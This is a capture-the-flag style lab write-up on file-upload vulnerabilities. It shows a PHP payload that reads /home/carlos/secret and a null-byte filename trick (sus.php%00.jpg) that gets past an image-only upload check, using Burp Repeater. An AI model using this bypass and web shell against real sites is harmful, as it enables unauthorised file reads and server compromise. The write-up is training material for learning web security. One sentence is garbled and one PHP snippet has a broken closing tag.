### We know this lab contains image upload function vunerablity. So lets start looking for it.

# Information gathering

![2_0](02.png)

We can upload the image file under Avatar lable.


We have to create a php executable file which contains a script for fetching the contents of (/home/carlos/secret).

```bash
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
or
```bash 
<?php
$sus = file_get_contents('/home/carlos/secret');
echo $sus
>
```

**Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.**
 There is file restiction to upload. Now we have to create an executable file to execute via web shell and bypass it.

# Exploit

![4_0](04.png)

Try uploading the file. In BurpSuite HTTP history and notice that your image was fetched using a **GET request to /files/avatars/<YOUR-IMAGE>**. Now send the GET request
to Burp reapeater.

In BurpSuite history if you observe the file submit **POST request /my-account/avatar** send it to the repeater tab
In the Content-Disposition header, change the value of the filename parameter to include a URL encoded null byte, followed by the .jpg extension:

```bash
filename="sus.php%00.jpg"
```

Send the request and observe that the file was successfully uploaded.

Notice that thele as expl message refers to the sus.php, suggesting that the null byte and .jpg extension have been stripped.

Now switch to the Repeater tab containing the **GET /files/avatars/<YOUR-IMAGE>** request. 

In the path, replace the name of your image file with sus.php and send the request. 

```bash
GET /files/avatars/sus.php HTTP/1.1
```

The Carlos's secret was returned in the response.

# Conclution
From this lab we gained the basic idea of how to bypass obfuscated file extention restriction file upload function vunerablity.
